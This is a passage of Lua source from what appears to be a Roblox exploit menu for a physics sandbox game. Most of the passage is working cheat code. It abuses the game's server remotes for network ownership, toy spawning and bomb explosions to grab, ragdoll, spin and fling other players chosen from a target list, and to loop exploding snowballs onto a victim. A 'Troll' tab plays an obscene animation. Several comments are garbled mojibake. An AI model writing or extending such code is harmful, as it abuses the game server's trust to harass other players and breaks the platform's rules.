            local pallet = FGM.MyToys:FindFirstChild("RagdollPallet") or FGM.MyToys:FindFirstChild("PalletLightBrown")
            if not pallet then
                FGM.ToySpawn:InvokeServer("PalletLightBrown", myHRP.CFrame * CFrame.new(5, 5, 20), Vector3.new(0, 0, 0))
                local t = tick() + 5
                repeat task.wait(0.05) until FGM.MyToys:FindFirstChild("PalletLightBrown") or tick() > t
                pallet = FGM.MyToys:FindFirstChild("PalletLightBrown")
            end

            if not pallet then return end

            pallet.Name = "RagdollPallet"
            local soundPart = pallet:WaitForChild("SoundPart", 5)
            if not soundPart then return end

            local t2 = tick() + 3
            repeat
                FGM.SetNetworkOwner:FireServer(soundPart, soundPart.CFrame)
                task.wait()
            until soundPart:FindFirstChild("PartOwner") or tick() > t2

            soundPart.AssemblyLinearVelocity = Vector3.new(0, 10000, 0)
            for _, v in pairs(pallet:GetDescendants()) do
                if v:IsA("BasePart") then
                    v.Transparency = 1
                    v.CanCollide = false
                end
            end

            FGM.State.RagdollPallet = pallet
            FGM.State.RagdollSoundPart = soundPart

            FGM.State.AutoRagdollConnection = FGM.RunService.Heartbeat:Connect(function()
                if not FGM.State.AutoRagdollEnabled then return end

                local sp = FGM.State.RagdollSoundPart
                if not sp or not sp.Parent then
                    if FGM.State.AutoRagdollConnection then
                        FGM.State.AutoRagdollConnection:Disconnect()
                        FGM.State.AutoRagdollConnection = nil
                    end
                    FGM.State.RagdollPallet = nil
                    FGM.State.RagdollSoundPart = nil
                    return
                end

                local targets = {}
                if FGM.State.FigureGrabEnabled and FGM.State.TargetCharacter then
                    table.insert(targets, FGM.State.TargetCharacter)
                end
                if FGM.State.SeveralEnabled then
                    for _, e in ipairs(FGM.State.SeveralTargets) do
                        table.insert(targets, e.char)
                    end
                end

                for _, targetChar in ipairs(targets) do
                    local hrp = targetChar:FindFirstChild("HumanoidRootPart")
                    local hum = targetChar:FindFirstChild("Humanoid")
                    if hrp and hum then
                        local ragdolled = hum:FindFirstChild("Ragdolled")
                        if ragdolled and ragdolled.Value == false then
                            task.spawn(function()
                                sp.AssemblyLinearVelocity = Vector3.new(0, 100, 0)
                                sp.CFrame = hrp.CFrame
                                task.wait(0.05)
                                if sp and sp.Parent then
                                    sp.CFrame = CFrame.new(0, 1e9, 0)
                                end
                            end)
                        end
                    end
                end
            end)
        end)
    end

    -- ============================
    -- UI: TARGET DROPDOWN (AUTO REFRESH)
    -- ============================
    local TargetBlock = Tabs.Figure:CreateBlock({Name = "Target", Side = "Left"})

    local function FG_GetPlayerList()
        local list = {}
        for _, p in ipairs(FGM.Players:GetPlayers()) do
            if p ~= FGM.LocalPlayer then
                table.insert(list, p.DisplayName .. " (@" .. p.Name .. ")")
            end
        end
        table.sort(list)
        return list
    end

    local function FG_GetUsernameFromFormatted(fmt)
        if type(fmt) ~= "string" then return "" end
        return fmt:match("%(@(.+)%)") or fmt
    end

    local PlayerDropdown = TargetBlock:CreateDropdown({
        Name = "Select Target",
        Items = FG_GetPlayerList(),
        Default = 1,
        Callback = function(Value)
            FGM.State.SelectedTarget = FG_GetUsernameFromFormatted(Value)
        end
    })

    local function updateDropdown()
        if PlayerDropdown then
            local newList = FG_GetPlayerList()
            pcall(function()
                PlayerDropdown:SetItems(newList, true)
                if newList[1] and not FGM.State.SelectedTarget then
                    PlayerDropdown:SetValue(newList[1])
                end
            end)
        end
    end

    task.spawn(function()
        while task.wait(2) do
            updateDropdown()
        end
    end)

    FGM.Players.PlayerAdded:Connect(function()
        task.wait(0.5)
        updateDropdown()
    end)

    FGM.Players.PlayerRemoving:Connect(function()
        task.wait(0.3)
        updateDropdown()
    end)

    -- ============================
    -- UI: FIGURE GRAB TOGGLE
    -- ============================
    local ToggleBlock = Tabs.Figure:CreateBlock({Name = "Controls", Side = "Left"})

    ToggleBlock:CreateToggle({
        Name = "Enable Figure Grab",
        Default = false,
        Callback = function(Value)
            if Value then
                if not FGM.State.SelectedTarget or FGM.State.SelectedTarget == "" then
                    return
                end
                FGM.ToggleFigureGrab()
            else
                if FGM.State.FigureGrabEnabled then
                    FGM.ToggleFigureGrab()
                end
            end
        end
    })

    do

    local ReplicatedStorage = game:GetService("ReplicatedStorage")
    local RunService = game:GetService("RunService")
    local Players = game:GetService("Players")
    local Workspace = game:GetService("Workspace")
    local LocalPlayer = Players.LocalPlayer

    local Remotes = {
        SpawnToy = ReplicatedStorage:WaitForChild("MenuToys"):WaitForChild("SpawnToyRemoteFunction"),
        SetNetOwner = ReplicatedStorage:WaitForChild("GrabEvents"):WaitForChild("SetNetworkOwner"),
        BombExplode = ReplicatedStorage:WaitForChild("BombEvents"):WaitForChild("BombExplode"),
        DestroyToy = ReplicatedStorage:WaitForChild("MenuToys"):WaitForChild("DestroyToy")
    }

    local snowballActive = false
    local snowballTask = nil

    ToggleBlock:CreateToggle({
        Name = "Loop Snowball(For ragdoll)",
        Default = false,
        Callback = function(v)
            snowballActive = v

            if snowballTask then
                task.cancel(snowballTask)
                snowballTask = nil
            end

            if v then
                snowballTask = task.spawn(function()
                    while snowballActive do
                        local target = FGM.State.SelectedTarget and Players:FindFirstChild(FGM.State.SelectedTarget)
                        if not target or not target.Character then
                            task.wait(0.1)
                            continue 
                        end

                        local tRoot = target.Character:FindFirstChild("HumanoidRootPart")
                        if not tRoot then 
                            task.wait(0.1)
                            continue 
                        end

                        local char = LocalPlayer.Character
                        local hrp = char and char:FindFirstChild("HumanoidRootPart")
                        if not hrp then 
                            task.wait(0.1)
                            continue 
                        end

                        local inv = Workspace:FindFirstChild(LocalPlayer.Name .. "SpawnedInToys")
                        if not inv then 
                            task.wait(0.1)
                            continue 
                        end

                        local ball = inv:FindFirstChild("BallSnowball")
                        if not ball then
                            task.spawn(function()
                                pcall(function() 
                                    Remotes.SpawnToy:InvokeServer("BallSnowball", hrp.CFrame * CFrame.new(0, 10, 20), Vector3.zero) 
                                end)
                            end)
                            task.wait(0.15)
                        else
                            local SoundPart = ball:FindFirstChild("SoundPart")
                            if SoundPart then
                                pcall(function() 
                                    Remotes.SetNetOwner:FireServer(SoundPart, SoundPart.CFrame) 
                                end)
                                task.wait(0.05)

                                SoundPart.CFrame = tRoot.CFrame
                                task.wait(0.05)

                                local payload = {
                                    Radius = 0,
                                    Color = Color3.new(0, 0, 0),
                                    TimeLength = 0,
                                    Model = ball,
                                    Type = "SnowPoof",
                                    ExplodesByFire = false,
                                    MaxForcePerStudSquared = 0,
                                    Hitbox = SoundPart,
                                    ImpactSpeed = 0,
                                    ExplodesByPointy = false,
                                    DestroysModel = true,
                                    PositionPart = SoundPart
                                }
                                
                                pcall(function() 
                                    Remotes.BombExplode:FireServer(payload, Vector3.zero) 
                                end)
                                task.wait(0.15)
                            else
                                task.wait(0.1)
                            end
                        end
                    end
                end)
            end
        end
    })
end

    local SettingsBlock = Tabs.Figure:CreateBlock({Name = "Settings", Side = "Left"})

    SettingsBlock:CreateToggle({
        Name = "Mirror My Animations",
        Default = false,
        Callback = function(v)
            if FGM.SetAnimationCopy then
                FGM.SetAnimationCopy(v)
            end
        end
    })

    SettingsBlock:CreateToggle({
        Name = "Smooth Movement",
        Default = true,
        Callback = function(v)
            FGM.Configuration.DampingEnabled = v
            if not v then
                FGM.State.SmoothedCFrames = {}
            end
        end
    })

    SettingsBlock:CreateSlider({
        Name = "Damping Speed",
        Default = 12,
        Min = 1,
        Max = 60,
        Callback = function(v)
            FGM.Configuration.DampingSpeed = v
        end
    })

    -- ============================
    -- UI: PHYSICS
    -- ============================
    local PhysicsBlock = Tabs.Figure:CreateBlock({Name = "Physics", Side = "Left"})

    PhysicsBlock:CreateToggle({
        Name = "Zero All Velocities",
        Default = false,
        Callback = function(v)
            FGM.State.VelSuppressEnabled = v
        end
    })

    PhysicsBlock:CreateToggle({
        Name = "Lock Torso Rotation",
        Default = false,
        Callback = function(v)
            FGM.State.LockRotationEnabled = v
        end
    })

    PhysicsBlock:CreateToggle({
        Name = "Keep Target Upright",
        Default = false,
        Callback = function(v)
            FGM.State.ForceUprightEnabled = v
        end
    })

    PhysicsBlock:CreateToggle({
        Name = "Face Toward Me",
        Default = false,
        Callback = function(v)
            FGM.State.ForceLookAtEnabled = v
        end
    })

    PhysicsBlock:CreateToggle({
        Name = "Anchor to Camera",
        Default = false,
        Callback = function(v)
            FGM.State.HoldAtCameraEnabled = v
        end
    })

    -- ============================
    -- UI: MOTION
    -- ============================
    local MotionBlock = Tabs.Figure:CreateBlock({Name = "Motion", Side = "Left"})

    MotionBlock:CreateToggle({
        Name = "Spin Target",
        Default = false,
        Callback = function(v)
            FGM.State.SpinEnabled = v
            FGM.State.SpinAngle = 0
        end
    })

    MotionBlock:CreateSlider({
        Name = "Spin Speed",
        Default = 180,
        Min = 10,
        Max = 720,
        Callback = function(v)
            FGM.State.SpinSpeed = v
        end
    })

    MotionBlock:CreateToggle({
        Name = "[FLOAT] Oscillate",
        Default = false,
        Callback = function(v)
            FGM.State.OscillateEnabled = v
            FGM.State.OscillateTimer = 0
        end
    })

    MotionBlock:CreateSlider({
        Name = "Float Speed",
        Default = 2,
        Min = 1,
        Max = 10,
        Callback = function(v)
            FGM.State.OscillateSpeed = v
        end
    })

    MotionBlock:CreateSlider({
        Name = "Float Distance",
        Default = 3,
        Min = 1,
        Max = 20,
        Callback = function(v)
            FGM.State.OscillateAmount = v
        end
    })

    -- ============================
    -- UI: LIMB CONTROL
    -- ============================
    local LimbBlock = Tabs.Figure:CreateBlock({Name = "Limb Control", Side = "Right"})

    LimbBlock:CreateDropdown({
        Name = "Select A Limb",
        Items = LIMB_OPTIONS,
        Default = "Head",
        Callback = function(selected)
            FGM.State.SelectedLimb = selected
            if FGM.ApplyLimbHighlight then
                FGM.ApplyLimbHighlight(selected)
            end
        end
    })

    LimbBlock:CreateSlider({
        Name = "Left / Right",
        Default = 0,
        Min = -50,
        Max = 50,
        Callback = function(v)
            local section = GetActiveSections().pos
            if FGM.UpdateConfig then
                FGM.UpdateConfig(section, 'X', v)
            end
        end
    })

    LimbBlock:CreateSlider({
        Name = "Up / Down",
        Default = 0,
        Min = -50,
        Max = 50,
        Callback = function(v)
            local section = GetActiveSections().pos
            if FGM.UpdateConfig then
                FGM.UpdateConfig(section, 'Y', v)
            end
        end
    })

    LimbBlock:CreateSlider({
        Name = "Forward / Back",
        Default = -5,
        Min = -50,
        Max = 50,
        Callback = function(v)
            local section = GetActiveSections().pos
            if FGM.UpdateConfig then
                FGM.UpdateConfig(section, 'Z', v)
            end
        end
    })

    LimbBlock:CreateSlider({
        Name = "Pitch (Up / Down)",
        Default = 0,
        Min = 0,
        Max = 360,
        Callback = function(v)
            local section = GetActiveSections().rot
            if FGM.UpdateConfig then
                FGM.UpdateConfig(section, 'X', v)
            end
        end
    })

    LimbBlock:CreateSlider({
        Name = "Yaw (Left / Right)",
        Default = 0,
        Min = 0,
        Max = 360,
        Callback = function(v)
            local section = GetActiveSections().rot
            if FGM.UpdateConfig then
                FGM.UpdateConfig(section, 'Y', v)
            end
        end
    })

    LimbBlock:CreateSlider({
        Name = "Roll (Tilt)",
        Default = 0,
        Min = 0,
        Max = 360,
        Callback = function(v)
            local section = GetActiveSections().rot
            if FGM.UpdateConfig then
                FGM.UpdateConfig(section, 'Z', v)
            end
        end
    })

    -- ============================
    -- UI: SNAP GRID
    -- ============================
    local SnapBlock = Tabs.Figure:CreateBlock({Name = "Snap Grid", Side = "Right"})

    SnapBlock:CreateToggle({
        Name = "Enable Snap",
        Default = false,
        Callback = function(v)
            FGM.Configuration.SnapEnabled = v
        end
    })

    SnapBlock:CreateSlider({
        Name = "Position Step",
        Default = 0.5,
        Min = 0.1,
        Max = 5,
        Callback = function(v)
            FGM.Configuration.SnapPosStep = v
        end
    })

    SnapBlock:CreateSlider({
        Name = "Rotation Step",
        Default = 15,
        Min = 1,
        Max = 90,
        Callback = function(v)
            FGM.Configuration.SnapRotStep = v
        end
    })

    -- ============================
    -- UI: POSES
    -- ============================
    local PosesBlock = Tabs.Figure:CreateBlock({Name = "Poses", Side = "Right"})

    PosesBlock:CreateDropdown({
        Name = "Select Pose",
        Items = { 'Pose1', 'Pose2', 'Pose3', 'Pose4', 'Pose5', 'Pose6', 'Pose7', 'JojoStand' },
        Default = 'Pose1',
        Callback = function(v)
            Options.FGM_PresetPose = v
        end
    })

    PosesBlock:CreateButton({
        Name = "Apply Pose",
        Callback = function()
            if FGM.ApplyPreset then
                local selected = Options.FGM_PresetPose or 'Pose1'
                FGM.ApplyPreset(selected)
            end
        end
    })

    PosesBlock:CreateButton({
        Name = "Reset to Default Pose",
        Callback = function()
            if FGM.ResetPose then
                FGM.ResetPose()
            end
        end
    })

    -- ============================
    -- UI: ACTIONS
    -- ============================
    local ActionsBlock = Tabs.Figure:CreateBlock({Name = "Actions", Side = "Right"})

    ActionsBlock:CreateButton({
        Name = "Force Re-Grab",
        Callback = function()
            local target = FGM.State.TargetCharacter
            if not target then return end
            if FGM.ExecuteGrabTP then
                FGM.ExecuteGrabTP(target)
            end
        end
    })

    ActionsBlock:CreateButton({
        Name = "Freeze Limbs",
        Callback = function()
            if FGM.SnapshotLimbsForFreeze then
                FGM.SnapshotLimbsForFreeze()
            end
            FGM.State.FreezeLimbsEnabled = true
        end
    })

    ActionsBlock:CreateButton({
        Name = "Unfreeze Limbs",
        Callback = function()
            FGM.State.FreezeLimbsEnabled = false
            FGM.State.FrozenCFrames = {}
        end
    })

    ActionsBlock:CreateButton({
        Name = "Release Target",
        Callback = function()
            if FGM.State.FigureGrabEnabled then
                FGM.ToggleFigureGrab()
            end
        end
    })
end
do

local Players = game:GetService("Players")
local UIS = game:GetService("UserInputService")

local Player = Players.LocalPlayer

local AnimationsGroup = Tabs.Main:CreateBlock({Name = "Animations", Side = "Right"})

local animEnabled = false
local currentTrack = nil
local selectedAnimName = "Crazy"
local animSpeed = 1

local Animations = {
    ["Head Throw"] = "rbxassetid://35154961",
    ["Floating Head"] = "rbxassetid://121572214",
    ["Crouch"] = "rbxassetid://182724289",
    ["Floor Crawl"] = "rbxassetid://282574440",
    ["Dino Walk"] = "rbxassetid://204328711",
    ["Jumping Jacks"] = "rbxassetid://429681631",
    ["Loop Head"] = "rbxassetid://35154961",
    ["Hero Jump"] = "rbxassetid://184574340",
    ["Faint"] = "rbxassetid://181526230",
    ["Floor Faint"] = "rbxassetid://181525546",
    ["Super Faint"] = "rbxassetid://181525546",
    ["Levitate"] = "rbxassetid://313762630",
    ["Float Sit"] = "rbxassetid://179224234",
    ["Weird Move"] = "rbxassetid://215384594",
    ["Clone Illusion"] = "rbxassetid://215384594",
    ["Glitch Levitate"] = "rbxassetid://313762630",
    ["Full Punch"] = "rbxassetid://204062532",
    ["Bow Down"] = "rbxassetid://204292303",
    ["Sword Slam"] = "rbxassetid://204295235",
    ["Loop Slam"] = "rbxassetid://204295235",
    ["Mega Insane"] = "rbxassetid://184574340",
    ["Super Punch"] = "rbxassetid://126753849",
    ["Full Swing"] = "rbxassetid://218504594",
    ["Arm Turbine"] = "rbxassetid://259438880",
    ["Barrel Roll"] = "rbxassetid://136801964",
    ["Scared"] = "rbxassetid://180612465",
    ["Insane"] = "rbxassetid://33796059",
    ["Arm Detach"] = "rbxassetid://33169583",
    ["Sword Slice"] = "rbxassetid://35978879",
    ["Insane Arms"] = "rbxassetid://27432691",
    ["Dab"] = "rbxassetid://183412246",
    ["Spinner"] = "rbxassetid://188632011",
    ["Moving Dance"] = "rbxassetid://429703734",
    ["Spin Dance"] = "rbxassetid://429730430",
    ["Moon Dance"] = "rbxassetid://45834924",
    ["Spin Dance 2"] = "rbxassetid://186934910",
    ["Thriller"] = "rbxassetid://27789359",
    ["Robot"] = "rbxassetid://30196114",
    ["Shuffle"] = "rbxassetid://248263260",
    ["Groove"] = "rbxassetid://33796059",
    ["Club"] = "rbxassetid://28488254",
    ["Jump Dance"] = "rbxassetid://52155728",
    ["Crazy"] = "rbxassetid://248263260",
    ["Collapse"] = "rbxassetid://35154961",
    ["Zombie"] = "rbxassetid://33796059",
}

function playAnimation()
    local char = Player.Character or Player.CharacterAdded:Wait()
    local hum = char:FindFirstChildOfClass("Humanoid")
    if not hum then return end
    local animator = hum:FindFirstChildOfClass("Animator")
    if not animator then
        animator = Instance.new("Animator")
        animator.Parent = hum
    end
    if currentTrack then
        currentTrack:Stop()
        currentTrack = nil
    end
    local anim = Instance.new("Animation")
    anim.AnimationId = Animations[selectedAnimName]
    currentTrack = animator:LoadAnimation(anim)
    currentTrack.Priority = Enum.AnimationPriority.Action
    currentTrack.Looped = true
    currentTrack:Play()
    currentTrack:AdjustSpeed(animSpeed)

    task.spawn(function()
        while animEnabled and currentTrack do
            if currentTrack.TimePosition > 5 then
                currentTrack.TimePosition = 0.3
            end
            task.wait(0.05)
        end
    end)
end

function stopAnimation()
    if currentTrack then
        currentTrack:Stop()
        currentTrack = nil
    end
end

AnimationsGroup:CreateToggle({
    Name = "Play Animation",
    Flag = "Play Animation",
    Default = false,
    Callback = function(on)
        SetToggleState("Play Animation", on)
        animEnabled = on
        if on then
            playAnimation()
        else
            stopAnimation()
        end
    end
})

AnimationsGroup:CreateDropdown({
    Name = "Animation",
    Items = {
        "Head Throw",
        "Floating Head",
        "Crouch",
        "Floor Crawl",
        "Dino Walk",
        "Jumping Jacks",
        "Loop Head",
        "Hero Jump",
        "Faint",
        "Floor Faint",
        "Super Faint",
        "Levitate",
        "Float Sit",
        "Weird Move",
        "Clone Illusion",
        "Glitch Levitate",
        "Full Punch",
        "Bow Down",
        "Sword Slam",
        "Loop Slam",
        "Mega Insane",
        "Super Punch",
        "Full Swing",
        "Arm Turbine",
        "Barrel Roll",
        "Scared",
        "Insane",
        "Arm Detach",
        "Sword Slice",
        "Insane Arms",
        "Dab",
        "Spinner",
        "Moving Dance",
        "Spin Dance",
        "Moon Dance",
        "Spin Dance 2",
        "Thriller",
        "Robot",
        "Shuffle",
        "Groove",
        "Club",
        "Jump Dance",
        "Crazy",
        "Collapse",
        "Zombie",
    },
    Default = "Crazy",
    Callback = function(v)
        selectedAnimName = v
        if animEnabled then
            playAnimation()
        end
    end
})

AnimationsGroup:CreateSlider({
    Name = "Speed",
    Default = 1,
    Min = 0.1,
    Max = 100,
    Callback = function(v)
        animSpeed = v
        if currentTrack and currentTrack.IsPlaying then
            currentTrack:AdjustSpeed(v)
        end
    end
})

local Players = game:GetService("Players")
local Player = Players.LocalPlayer

function getNearestBlobman(maxDist)
	local char = Player.Character
	local hrp = char and char:FindFirstChild("HumanoidRootPart")
	if not hrp then
		return
	end
	local nearest, dist = nil, maxDist or 50
	for _, model in ipairs(workspace:GetDescendants()) do
		if model:IsA("Model") and model.Name == "CreatureBlobman" then
			local root = model:FindFirstChild("HumanoidRootPart") or model.PrimaryPart
			if root then
				local d = (root.Position - hrp.Position).Magnitude
				if d < dist then
					dist = d
					nearest = model
				end
			end
		end
	end
	return nearest
end

function SitOnBlobman()
	local char = Player.Character
	if not char then
		return
	end
	local hum = char:FindFirstChildOfClass("Humanoid")
	local hrp = char:FindFirstChild("HumanoidRootPart")
	if not hum or not hrp then
		return
	end

    -- СѓР¶Рµ СЃРёРґРёРј
	if hum.SeatPart then
		return
	end

    -- РёС‰РµРј Р‘Р›РР–РђР™РЁР•Р“Рћ
	local blob = getNearestBlobman(40)
	if not blob then
		warn("Blobman not found nearby")
		return
	end

    -- РёС‰РµРј СЃРёРґ
	local seat =
        blob:FindFirstChildWhichIsA("Seat", true)
        or blob:FindFirstChildWhichIsA("VehicleSeat", true)
	if not seat then
		warn("Blobman seat not found")
		return
	end

    -- С‚РµР»РµРїРѕСЂС‚ Р РЇР”РћРњ СЃ Р±Р»РѕР±РѕРј (РЅРµ РІ РµР±РµРЅСЏ)
	hrp.CFrame = seat.CFrame * CFrame.new(0, 1.2, -1)
	task.wait(0.05)

    -- РџР РРќРЈР”РРўР•Р›Р¬РќРђРЇ РџРћРЎРђР”РљРђ
	pcall(function()
		seat:Sit(hum)
	end)
end


KeybindsGroup:CreateKeybind({
	Name = "Sit on nearest Blobman",
	Flag = "SitBlobmanKey",
	Default = "Z",
	Callback = function()
		SitOnBlobman()
	end
})


do
local TrollExtraGroup = Tabs.Main:CreateBlock({Name = "Troll", Side = "Right"})

local Players = game:GetService("Players")

local playBangActive = false
local bangAnimTrack = nil
local bangAnimId = "rbxassetid://148840371" -- Bang РёР· Infinite Yield
local bangSpeed = 10-- рџ”Ґ РЎРљРћР РћРЎРўР¬ (1 = РЅРѕСЂРјР°Р»СЊРЅРѕ, 0.3вЂ“0.5 РјРµРґР»РµРЅРЅРѕ)

-- в–¶ Р·Р°РїСѓСЃРє Р°РЅРёРјР°С†РёРё
function startBang()
	local plr = Players.LocalPlayer
	local char = plr.Character or plr.CharacterAdded:Wait()
	local hum = char:FindFirstChildOfClass("Humanoid")
	if not hum then
		return
	end
	local animator = hum:FindFirstChildOfClass("Animator")
	if not animator then
		animator = Instance.new("Animator")
		animator.Parent = hum
	end
	local anim = Instance.new("Animation")
	anim.AnimationId = bangAnimId
	bangAnimTrack = animator:LoadAnimation(anim)
	bangAnimTrack.Priority = Enum.AnimationPriority.Action
	bangAnimTrack:Play()
	bangAnimTrack:AdjustSpeed(bangSpeed) -- рџђў Р·Р°РјРµРґР»РµРЅРёРµ

    -- Infinite Yield loop
	task.spawn(function()
		while playBangActive do
			task.wait(0.1)
			if bangAnimTrack and bangAnimTrack.IsPlaying then
				bangAnimTrack.TimePosition = 0.1
			end
		end
	end)
end

-- вЏ№ РѕСЃС‚Р°РЅРѕРІРєР°
function stopBang()
	if bangAnimTrack then
		bangAnimTrack:Stop()
		bangAnimTrack = nil
	end
end

-- рџ” Toggle
TrollExtraGroup:CreateToggle({
	Name = "Bang (Slow)",
        Flag = "Bang (Slow)",
	Default = false,
	Callback = function(on)
        SetToggleState("Bang (Slow)", on)
		playBangActive = on
		if on then
			startBang()
		else
			stopBang()
		end
	end
})


do
    local Lighting = game:GetService("Lighting")
    local Visuals = {}

    Visuals.DefaultLighting = {
        Brightness=Lighting.Brightness, ClockTime=Lighting.ClockTime,
        GlobalShadows=Lighting.GlobalShadows, OutdoorAmbient=Lighting.OutdoorAmbient,
        Ambient=Lighting.Ambient, FogStart=Lighting.FogStart, FogEnd=Lighting.FogEnd,
        FogColor=Lighting.FogColor, ExposureCompensation=Lighting.ExposureCompensation,
    }
    Visuals.DefaultSkySettings = {}
    local defaultSky = Lighting:FindFirstChildOfClass("Sky")
    if defaultSky then
        Visuals.DefaultSkySettings = {
            SkyboxBk=defaultSky.SkyboxBk, SkyboxDn=defaultSky.SkyboxDn,
            SkyboxFt=defaultSky.SkyboxFt, SkyboxLf=defaultSky.SkyboxLf,
            SkyboxRt=defaultSky.SkyboxRt, SkyboxUp=defaultSky.SkyboxUp,
        }
    end

    Visuals.HatEnabled=false; Visuals.HatTransparency=0.3; Visuals.HatRainbow=false
    Visuals.HatColor=Color3.fromRGB(0,255,255); Visuals.HatParts={}
    Visuals.TrailEnabled=false; Visuals.TrailGradient=false; Visuals.TrailLifetime=0.5
    Visuals.TrailTransparencyStart=0; Visuals.TrailRainbow=false
    Visuals.TrailColorStatic=Color3.fromRGB(0,255,255)
    Visuals.TrailGradient1=Color3.fromRGB(0,86,255); Visuals.TrailGradient2=Color3.fromRGB(255,0,0)
    Visuals.TrailParts={}
    Visuals.SkinTrailEnabled=false; Visuals.SkinTrailColor=Color3.fromRGB(255,0,0); Visuals.SkinTrailLife=0.5
    Visuals.ForceFieldEnabled=false; Visuals.ForceFieldColor=Color3.fromRGB(128,128,128)
    Visuals.ForceFieldRainbow=false; Visuals.OriginalColors={}
    Visuals.AuraEnabled=false; Visuals.AuraType="Godly"; Visuals.CustomAuraID=""
    Visuals.CurrentAuraModel=nil; Visuals.AuraEffects={}
    Visuals.WorldTimeEnabled=false; Visuals.WorldTimeValue=12; Visuals.FullBrightEnabled=false
    Visuals.NebulaEnabled=false; Visuals.NebulaThemeColor=Color3.fromRGB(173,216,230)
    Visuals.CurrentSkybox="HD"; Visuals.CustomSkyEnabled=false
    Visuals.ScreenEnabled=false; Visuals.ScreenIntensity=0; Visuals.ScreenConnection=nil
    Visuals.AnimeImageEnabled=false; Visuals.AnimeImageGui=nil

    Visuals.AuraModels = {
        Godly="rbxassetid://16699750981",["Super Sayien"]="rbxassetid://116109508364297",
        ["North Star"]="rbxassetid://83945069652732",["Blue Lord"]="rbxassetid://10974316799",
        ["Pink Aura"]="rbxassetid://115980859615239",["Angel Wing"]="rbxassetid://90022969696073",
        ["Sweet Heart"]="rbxassetid://91724768175470",["Ethereal Aura"]="rbxassetid://97041568674250",
    }

    Visuals.SkyboxAssets = {
        ["Black Storm"]={Bk="rbxassetid://15502511288",Dn="rbxassetid://15502508460",Ft="rbxassetid://15502510289",Lf="rbxassetid://15502507918",Rt="rbxassetid://15502509398",Up="rbxassetid://15502511911"},
        HD={Bk="http://www.roblox.com/asset/?id=16553658937",Dn="http://www.roblox.com/asset/?id=16553660713",Ft="http://www.roblox.com/asset/?id=16553662144",Lf="http://www.roblox.com/asset/?id=16553664042",Rt="http://www.roblox.com/asset/?id=16553665766",Up="http://www.roblox.com/asset/?id=16553667750"},
        Snow={Bk="http://www.roblox.com/asset/?id=155657655",Dn="http://www.roblox.com/asset/?id=155674246",Ft="http://www.roblox.com/asset/?id=155657609",Lf="http://www.roblox.com/asset/?id=155657671",Rt="http://www.roblox.com/asset/?id=155657619",Up="http://www.roblox.com/asset/?id=155674931"},
        ["Blue Space"]={Bk="rbxassetid://15536110634",Dn="rbxassetid://15536112543",Ft="rbxassetid://15536116141",Lf="rbxassetid://15536114370",Rt="rbxassetid://15536118762",Up="rbxassetid://15536117282"},
        Realistic={Bk="rbxassetid://653719502",Dn="rbxassetid://653718790",Ft="rbxassetid://653719067",Lf="rbxassetid://653719190",Rt="rbxassetid://653718931",Up="rbxassetid://653719321"},
        Stormy={Bk="http://www.roblox.com/asset/?id=18703245834",Dn="http://www.roblox.com/asset/?id=18703243349",Ft="http://www.roblox.com/asset/?id=18703240532",Lf="http://www.roblox.com/asset/?id=18703237556",Rt="http://www.roblox.com/asset/?id=18703235430",Up="http://www.roblox.com/asset/?id=18703232671"},
        Pink={Bk="rbxassetid://12216109205",Dn="rbxassetid://12216109875",Ft="rbxassetid://12216109489",Lf="rbxassetid://12216110170",Rt="rbxassetid://12216110471",Up="rbxassetid://12216108877"},
        Sunset={Bk="rbxassetid://600830446",Dn="rbxassetid://600831635",Ft="rbxassetid://600832720",Lf="rbxassetid://600886090",Rt="rbxassetid://600833862",Up="rbxassetid://600835177"},
        Arctic={Bk="http://www.roblox.com/asset/?id=225469390",Dn="http://www.roblox.com/asset/?id=225469395",Ft="http://www.roblox.com/asset/?id=225469403",Lf="http://www.roblox.com/asset/?id=225469450",Rt="http://www.roblox.com/asset/?id=225469471",Up="http://www.roblox.com/asset/?id=225469481"},
        Space={Bk="http://www.roblox.com/asset/?id=166509999",Dn="http://www.roblox.com/asset/?id=166510057",Ft="http://www.roblox.com/asset/?id=166510116",Lf="http://www.roblox.com/asset/?id=166510092",Rt="http://www.roblox.com/asset/?id=166510131",Up="http://www.roblox.com/asset/?id=166510114"},
        ["Roblox Default"]={Bk="rbxasset://textures/sky/sky512_bk.tex",Dn="rbxasset://textures/sky/sky512_dn.tex",Ft="rbxasset://textures/sky/sky512_ft.tex",Lf="rbxasset://textures/sky/sky512_lf.tex",Rt="rbxasset://textures/sky/sky512_rt.tex",Up="rbxasset://textures/sky/sky512_up.tex"},
        ["Red Night"]={Bk="http://www.roblox.com/asset/?id=401664839",Dn="http://www.roblox.com/asset/?id=401664862",Ft="http://www.roblox.com/asset/?id=401664960",Lf="http://www.roblox.com/asset/?id=401664881",Rt="http://www.roblox.com/asset/?id=401664901",Up="http://www.roblox.com/asset/?id=401664936"},
        ["Deep Space 1"]={Bk="http://www.roblox.com/asset/?id=149397692",Dn="http://www.roblox.com/asset/?id=149397686",Ft="http://www.roblox.com/asset/?id=149397697",Lf="http://www.roblox.com/asset/?id=149397684",Rt="http://www.roblox.com/asset/?id=149397688",Up="http://www.roblox.com/asset/?id=149397702"},
        ["Pink Skies"]={Bk="http://www.roblox.com/asset/?id=151165214",Dn="http://www.roblox.com/asset/?id=151165197",Ft="http://www.roblox.com/asset/?id=151165224",Lf="http://www.roblox.com/asset/?id=151165191",Rt="http://www.roblox.com/asset/?id=151165206",Up="http://www.roblox.com/asset/?id=151165227"},
        ["Purple Sunset"]={Bk="rbxassetid://264908339",Dn="rbxassetid://264907909",Ft="rbxassetid://264909420",Lf="rbxassetid://264909758",Rt="rbxassetid://264908886",Up="rbxassetid://264907379"},
        ["Blue Night"]={Bk="http://www.roblox.com/asset/?id=12064107",Dn="http://www.roblox.com/asset/?id=12064152",Ft="http://www.roblox.com/asset/?id=12064121",Lf="http://www.roblox.com/asset/?id=12063984",Rt="http://www.roblox.com/asset/?id=12064115",Up="http://www.roblox.com/asset/?id=12064131"},
        ["Blossom Daylight"]={Bk="http://www.roblox.com/asset/?id=271042516",Dn="http://www.roblox.com/asset/?id=271077243",Ft="http://www.roblox.com/asset/?id=271042556",Lf="http://www.roblox.com/asset/?id=271042310",Rt="http://www.roblox.com/asset/?id=271042467",Up="http://www.roblox.com/asset/?id=271077958"},
        ["Blue Nebula"]={Bk="http://www.roblox.com/asset?id=135207744",Dn="http://www.roblox.com/asset?id=135207662",Ft="http://www.roblox.com/asset?id=135207770",Lf="http://www.roblox.com/asset?id=135207615",Rt="http://www.roblox.com/asset?id=135207695",Up="http://www.roblox.com/asset?id=135207794"},
